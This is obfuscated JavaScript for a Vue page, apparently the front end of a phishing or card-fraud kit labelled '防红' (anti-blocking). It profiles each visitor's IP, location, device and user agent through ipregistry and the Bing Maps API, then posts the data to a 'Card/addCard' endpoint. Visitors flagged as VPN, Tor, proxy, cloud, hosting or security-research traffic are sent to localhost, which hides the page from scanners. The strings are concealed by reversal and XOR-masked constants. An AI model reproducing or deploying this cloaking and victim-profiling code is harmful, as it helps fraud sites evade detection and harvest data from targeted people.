var v2 = new Vue({
    "el": "#appAll"
    , "data"() {
        return {
            "userInfo": {
                "ua": null
                , "ip": null
                , "language": null
                , "ipzip": null
                , "ipguojia": null
                , "domainName": ""
            }
            , 'isOk': "防红"
            , "timer": ""
            , 'setup': 0x0
            , 'ruleList': null
        };
    }
    , "created"() {
        // Fetch the rule list from a configured server URL
        axios.get(configAll["serverUrl"] + "general.Config/getRuleList").then(response => {
            // Store the fetched rule list in the component's data
            this.ruleList = response.data.list;

            // Decoded from 0x2b775 ^ 0x2b776, assuming it's an index in the list
            let ruleIndex = 0x2b775 ^ 0x2b776; // Simplify or calculate the actual index
            let ruleValue = 0x40271 ^ 0x40270; // Simplify or calculate the actual value

            // Check if a specific rule's value matches the expected value
            if (response.data.list[ruleIndex].value == ruleValue) {
                // Call the 'red' method if the condition is true
                this.red();
            } else {
                // Set default user information if the condition is false
                this.userInfo = {
                    ip: "17.0.0.71", // Decoded from 0x10f447
                    language: "en", // English
                    ipCountry: "us", // United States
                    userAgent: 'US', // User Agent (simplified to 'US' here)
                    ipZip: "test", // Zip code for IP location (placeholder)
                    domainName: "" // Domain name (empty by default)
                };
                // Call the method to handle the case when no IP is found or saved
                this.saveipNull();
            }

            // Save the fetched data to local storage for later use
            let reversedRuleListKey = "tsiLelur".split("").reverse().join(""); // "ruleList" reversed
            localStorage.setItem(reversedRuleListKey, JSON.stringify(response.data));
        }).catch(error => {
            // Log any errors during the fetch to the console
            console.log(error);
        });
    }

    , "mounted"() {
        var _0xf37aac = {
            'page': "防红"
            , 'value': ""
        };
        parent['postMessage'](_0xf37aac, "*");
    }
    , 'methods': {
        'red'() {
            let _0x4ae097 = this;
            fetch("https://api.ipregistry.co/?key=" + this["ruleList"][0xa1385 ^ 0xa1384]['value'])['then'](function (_0x547914) {
                return _0x547914['json']();
            })["then"](function _0x1c9532(_0x41ee7a) {
                _0x4ae097['userInfo']['ip'] = _0x41ee7a["ip"];
                _0x4ae097["checkIp"](_0x4ae097["userInfo"]['ip']);
                _0x4ae097["userInfo"]['language'] = _0x41ee7a["location"]['language']['name'];
                _0x4ae097["userInfo"]["ipzip"] = _0x41ee7a['location']['postal'];
                const _0x365330 = _0x41ee7a['location']["country"]["code"];
                _0x4ae097["userInfo"]["ipguojia"] = _0x365330;
                _0x4ae097['checkCity'](_0x365330);
                _0x4ae097["userInfo"]['ua'] = _0x41ee7a["user_agent"]["header"];
                const _0x59c986 = _0x41ee7a["user_agent"]['device']["type"];
                const _0x5d71e2 = _0x41ee7a["user_agent"]['os']['type'];
                const _0x3ad8ae = _0x41ee7a["user_agent"]['os']["name"];
                _0x4ae097["checkShebei"](_0x3ad8ae);
                const _0x55e25 = _0x41ee7a['security']['is_abuser'];
                const _0x2da692 = _0x41ee7a["security"]['is_anonymous'];
                const _0xa35fb1 = _0x41ee7a['security']['is_attacker'];
                const _0x29eaf0 = _0x41ee7a['security']['is_bogon'];
                let _0x4485d6 = {};
                const _0x238c33 = _0x41ee7a['security']['is_cloud_provider'];
                _0x4485d6["is_cloud_provider"] = _0x238c33;
                const _0x4ee1fd = _0x41ee7a['security']["is_proxy"];
                _0x4485d6['is_proxy'] = _0x4ee1fd;
                const _0x1eecaf = _0x41ee7a["security"]["is_tor"];
                _0x4485d6["is_tor"] = _0x1eecaf;
                const _0x47dce1 = _0x41ee7a["security"]["is_relay"];
                _0x4485d6["is_relay"] = _0x47dce1;
                const _0x19eebd = _0x41ee7a["security"]["is_threat"];
                _0x4485d6['is_threat'] = _0x19eebd;
                const _0x1f5953 = _0x41ee7a['security']['is_tor_exit'];
                _0x4485d6['is_tor_exit'] = _0x1f5953;
                const _0x3be174 = _0x41ee7a['security']['is_vpn'];
                _0x4485d6['is_vpn'] = _0x3be174;
                const _0x61f48e = _0x41ee7a['connection']['type'];
                const _0x5085de = ["cdn", "gnitsoh".split("")
                    .reverse()
                    .join(""), 'education'];
                if (_0x55e25 == !![] || _0x61f48e == 'cdn' || _0x61f48e == "gnitsoh".split("")
                    .reverse()
                    .join("") || _0x61f48e == 'education' || _0x2da692 == !![] || _0xa35fb1 == !![] || _0x29eaf0 == !![]) {
                    window['location'] = 'https://localhost';
                    return ![];
                }
                if (_0x4ae097['openVpn'](_0x4485d6)) {
                    _0x4ae097['saveip'](_0x41ee7a['location']['latitude'], _0x41ee7a['location']['longitude']);
                }
            })['catch'](_0x70ebac => {
                _0x4ae097['saveipNull']();
            });
        }
        , 'getHome'() {
            window['location'] = './indexInfore.html';
        }
        , 'mapAddress'(_0x2fcbf7, _0x521c4d) {}
        , 'checkIp'(_0x142edc) {
            axios["get"](configAll['serverUrl'] + "pIkcehc/draC".split("")
                .reverse()
                .join(""), {
                    'params': {
                        'ip': _0x142edc
                    }
                })['then'](_0x1010d => {
                if (_0x1010d['data']['data']?.["sutatSpi".split("")
                        .reverse()
                        .join("")] == (0xa4a97 ^ 0xa4a97)) {
                    window['location'] = "tsohlacol//:sptth".split("")
                        .reverse()
                        .join("");
                } else {
                    this['setup'] = this["setup"] + (0x67d89 ^ 0x67d88);
                }
            })['catch'](requestError => {
                console['log'](requestError);
            });
        }
        , 'checkCity'(_0x4fae25) {
            let _0x41a31b = JSON['parse'](this['ruleList'][0xb0d3b ^ 0xb0d3c]['content']);
            let _0x30c32a = this['ruleList'][0xa7f8f ^ 0xa7f88]['value']['split'](',');
            for (let _0x4083ca = 0x49fa6 ^ 0x49fa6; _0x4083ca < _0x30c32a['length']; _0x4083ca++) {
                if (_0x41a31b[_0x30c32a[_0x4083ca]] == _0x4fae25) {
                    this['setup'] = this['setup'] + (0x6106e ^ 0x6106f);
                    return 0xde27a ^ 0xde27b;
                }
            }
            window['location'] = "tsohlacol//:sptth".split("")
                .reverse()
                .join("");
        }
        , 'saveip'(_0x243045, _0x48cf7b) {
            this['userInfo']['domainName'] = window["location"]['host'];
            axios['get']("/snoitacoL/1v/TSER/ten.htraelautriv.ved//:sptth".split("")
                .reverse()
                .join("") + _0x243045 + ',' + _0x48cf7b + '?o=JSON&key=' + configAll['mapkey'])['then'](_0x29d37e => {
                this['userInfo']['ipAddress'] = _0x29d37e['data']['resourceSets'][0x0]['resources'][0x0]['name'];
                this['timer'] = setInterval(() => {
                    if (this['setup'] == 0x4) {
                        clearInterval(this['timer']);
                        axios['post'](configAll['serverUrl'] + 'Card/addCard', this['userInfo'])['then'](_0x2069a4 => {
                            localStorage['setItem']("addressInfore", JSON["stringify"](_0x2069a4['data']['data']));
                            this['getHome']();
                        })['catch'](_0x3af267 => {
                            console["log"](_0x3af267);
                        });
                    }
                }, 0xc8);
            })['catch'](_0x1be1d2 => {
                console['log'](_0x1be1d2);
            });
        }
        , 'saveipNull'() {
            this['userInfo']['domainName'] = window['location']["host"];
            axios['post'](configAll["serverUrl"] + "draCdda/draC".split("")
                .reverse()
                .join(""), this['userInfo'])['then'](_0x86af86 => {
                localStorage['setItem']('addressInfore', JSON['stringify'](_0x86af86["data"]['data']));
                this['getHome']();
            })['catch'](_0x58a2ea => {
                console['log'](_0x58a2ea);
            });
        }
        , 'checkShebei'(_0x23ee82) {
            let _0x3e10ed = _0x23ee82 == "diordnA".split("")
                .reverse()
                .join("") ? 0x30e92 ^ 0x30e93 : _0x23ee82 == "SOi".split("")
                .reverse()
                .join("") ? 0x2 : 0x18880 ^ 0x18883;
            let _0x31946b = this['ruleList'][0x870aa ^ 0x870a2]['value']['split'](',');
            for (let _0x47f675 = 0x0; _0x47f675 < _0x31946b['length']; _0x47f675++) {
                if (_0x31946b[_0x47f675] == _0x3e10ed) {
                    this['setup'] = this['setup'] + (0x84080 ^ 0x84081);
                    return 0x1;
                }
            }
            window["location"] = "tsohlacol//:sptth".split("")
                .reverse()
                .join("");
        }
        , 'openVpn'(_0x4c0552) {
            let _0x1627bb = this['ruleList'][0x6]['value']['split'](",");
            for (let _0x137a04 = 0x8f552 ^ 0x8f552; _0x137a04 < _0x1627bb['length']; _0x137a04++) {
                switch (_0x1627bb[_0x137a04]) {
                case '1':
                    if (_0x4c0552['is_vpn']) {
                        window["location"] = 'https://localhost';
                    }
                    break;
                case '2':
                    if (_0x4c0552['is_proxy']) {
                        window['location'] = "tsohlacol//:sptth".split("")
                            .reverse()
                            .join("");
                    }
                    break;
                case '5':
                    if (_0x4c0552['is_relay']) {
                        window["location"] = 'https://localhost';
                    }
                    break;
                case '6':
                    if (_0x4c0552["is_cloud_provider"]) {
                        window['location'] = 'https://localhost';
                    }
                    break;
                case '7':
                    if (_0x4c0552['is_tor']) {
                        window["location"] = "https://localhost";
                    }
                    break;
                case '8':
                    if (_0x4c0552['is_tor_exit']) {
                        window['location'] = 'https://localhost';
                    }
                    break;
                case "01".split("")
                .reverse()
                .join(""):
                    if (_0x4c0552['is_threat']) {
                        window["location"] = 'https://localhost';
                    }
                    break;
                default:
                    break;
                }
            }
            this['setup'] = this['setup'] + 0x1;
            return !![];
        }
    }
});
